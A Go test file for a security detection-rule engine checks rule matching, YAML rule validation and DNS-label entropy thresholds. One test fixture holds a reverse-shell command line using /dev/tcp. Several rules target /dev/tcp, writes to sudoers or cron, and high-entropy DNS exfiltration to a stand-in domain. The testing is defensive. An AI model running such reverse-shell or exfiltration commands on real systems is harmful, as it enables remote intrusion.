package rules

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRuleMatchesSelections(t *testing.T) {
	rule := Rule{Detection: []Selection{
		{"event_type": "process.exec", "argv_contains": "/dev/tcp"},
		{"event_type": "file.write", "path_regex": `^/etc/(sudoers|cron)`},
	}}

	tests := []struct {
		name string
		ctx  MatchContext
		want bool
	}{
		{
			name: "argv array match",
			ctx: MatchContext{
				EventType: "process.exec",
				Fields:    map[string]interface{}{"argv": []interface{}{"bash", "-c", "bash -i >& /dev/tcp/host/22"}},
			},
			want: true,
		},
		{
			name: "path regex match",
			ctx:  MatchContext{EventType: "file.write", Fields: map[string]interface{}{"path": "/etc/cron.d/job"}},
			want: true,
		},
		{
			name: "benign process does not match",
			ctx:  MatchContext{EventType: "process.exec", Fields: map[string]interface{}{"argv": []string{"restic", "backup"}}},
		},
		{
			name: "wrong event type does not match",
			ctx:  MatchContext{EventType: "auth.sudo", Fields: map[string]interface{}{"path": "/etc/sudoers"}},
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := rule.Matches(test.ctx); got != test.want {
				t.Fatalf("Matches() = %v, want %v", got, test.want)
			}
		})
	}
}

func TestRuleMatchesEntropyAndFields(t *testing.T) {
	rule := Rule{Detection: []Selection{
		{"event_type": "dns.query", "domain_entropy_gte": 3.1},
		{"event_type": "auth.sudo", "command_contains": "apt-get upgrade"},
	}}

	if !rule.Matches(MatchContext{
		EventType:     "dns.query",
		Domain:        "a1b2c3d4e5f607182930abcd.exfil-example.net",
		DomainEntropy: 3.8,
	}) {
		t.Fatal("expected high-entropy DNS event to match")
	}
	if rule.Matches(MatchContext{EventType: "dns.query", Domain: "api.github.com", DomainEntropy: LeftmostLabelEntropy("api.github.com")}) {
		t.Fatal("benign api.github.com should not match")
	}
	if !rule.Matches(MatchContext{
		EventType: "auth.sudo",
		Fields:    map[string]interface{}{"command": "/usr/bin/apt-get upgrade -y"},
	}) {
		t.Fatal("expected command substring to match")
	}
}

func TestLoadRulesValidatesRules(t *testing.T) {
	tests := []struct {
		name  string
		files map[string]string
		want  string
	}{
		{
			name:  "unknown selection key",
			files: map[string]string{"01.yaml": validRuleYAML("porcess: bash")},
			want:  `unknown key "porcess"`,
		},
		{
			name:  "bad regular expression",
			files: map[string]string{"01.yaml": validRuleYAML(`path_regex: "["`)},
			want:  "path_regex is invalid",
		},
		{
			name:  "empty regular expression",
			files: map[string]string{"01.yaml": validRuleYAML(`path_regex: ""`)},
			want:  "path_regex must not be empty",
		},
		{
			name:  "invalid aggregation group",
			files: map[string]string{"01.yaml": aggregationRuleYAML("not-a-field", "5m", 5)},
			want:  "aggregation.group_by",
		},
		{
			name:  "zero aggregation window",
			files: map[string]string{"01.yaml": aggregationRuleYAML("src_ip", "0s", 5)},
			want:  "aggregation.window must be positive",
		},
		{
			name: "duplicate rule ID",
			files: map[string]string{
				"01.yaml": validRuleYAML(`event_type: process.exec`),
				"02.yaml": validRuleYAML(`event_type: file.write`),
			},
			want: "duplicate rule id",
		},
		{
			name: "unknown top-level field",
			files: map[string]string{"01.yaml": strings.Replace(
				validRuleYAML(`event_type: process.exec`), "severity: medium", "severity: medium\nmisspelled: true", 1,
			)},
			want: "field misspelled not found",
		},
		{
			name: "aggregation with extra matching clauses",
			files: map[string]string{"01.yaml": strings.Replace(
				aggregationRuleYAML("src_ip", "5m", 5),
				"aggregation:\n", "  - outcome: failure\naggregation:\n", 1,
			)},
			want: "aggregation requires exactly one selection",
		},
		{
			name:  "empty rule directory",
			files: map[string]string{},
			want:  "no .yaml rule files",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			dir := t.TempDir()
			for name, content := range test.files {
				if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			_, err := LoadRules(dir)
			if err == nil || !strings.Contains(err.Error(), test.want) {
				t.Fatalf("LoadRules() error = %v, want containing %q", err, test.want)
			}
		})
	}
}

func TestLoadRulesShippedRules(t *testing.T) {
	rules, err := LoadRules("../../rules")
	if err != nil {
		t.Fatal(err)
	}
	if len(rules) != 6 {
		t.Fatalf("loaded %d rules, want 6", len(rules))
	}
}

func TestLeftmostLabelEntropyCalibration(t *testing.T) {
	for _, domain := range []string{
		"api.github.com",
		"security.ubuntu.com",
		"registry.npmjs.org",
		"codeload.github.com",
	} {
		if got := LeftmostLabelEntropy(domain); got >= 3.1 {
			t.Errorf("LeftmostLabelEntropy(%q) = %.2f, want below 3.1", domain, got)
		}
	}

	random := rand.New(rand.NewSource(42))
	const alphabet = "0123456789abcdef"
	detected := 0
	for sample := 0; sample < 200; sample++ {
		var label strings.Builder
		for i := 0; i < 20; i++ {
			label.WriteByte(alphabet[random.Intn(len(alphabet))])
		}
		if LeftmostLabelEntropy(fmt.Sprintf("%s.exfil-example.net", label.String())) >= 3.1 {
			detected++
		}
	}
	if rate := float64(detected) / 200; rate < 0.6 {
		t.Errorf("random-label detection rate = %.0f%%, want at least 60%%", rate*100)
	}
}

func validRuleYAML(selection string) string {
	return fmt.Sprintf(`id: test-rule
title: Test rule
description: test
attack: []
severity: medium
detection:
  - %s
`, selection)
}

func aggregationRuleYAML(groupBy, window string, count int) string {
	return fmt.Sprintf(`id: test-rule
title: Test rule
severity: medium
detection:
  - event_type: auth.login_failure
aggregation:
  group_by: %s
  window: %s
  count_gte: %d
`, groupBy, window, count)
}
